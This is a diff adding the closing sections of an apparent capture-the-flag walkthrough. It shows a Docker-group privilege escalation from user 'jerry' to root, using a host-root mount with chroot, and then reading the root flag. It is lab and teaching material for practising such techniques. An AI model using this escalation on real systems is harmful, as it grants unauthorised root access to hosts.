@@ -171,3 +171,39 @@ cat user2.txt
 # Fl4g{Y0ur34ch3du53r25uc355ful1y}
 ```
 ![Nmap Scan Results](screenshot/flag2.png)
+
+5. Vertical Privilege Escalation (jerry → root)
+Check user groups and Docker access :
+
+```bash
+id
+# Output: uid=1002(jerry) gid=1002(jerry) groups=1002(jerry),114(docker)
+
+docker images -a
+# Output shows alpine image available
+```
+
+Docker Privilege Escalation :
+
+```bash
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+This command:
+
+Mounts the host's root directory to /mnt in the container
+
+Uses chroot to change the root to /mnt
+
+Provides a shell with root access to the host system
+
+6. Root Flag
+   
+Third Flag (root.txt) :
+
+```bash
+cd /root
+cat root.txt
+```
+
+Output :
+![Nmap Scan Results](screenshot/flag2.png)
